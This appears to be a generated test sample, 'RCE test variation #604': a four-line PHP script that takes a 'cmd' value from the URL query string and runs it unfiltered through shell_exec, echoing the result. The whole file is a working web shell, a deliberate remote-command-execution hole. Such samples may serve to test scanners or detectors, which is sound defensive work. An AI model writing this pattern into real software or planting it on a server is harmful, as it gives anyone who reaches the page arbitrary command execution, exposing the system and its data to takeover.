<?php
// RCE test variation #604
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>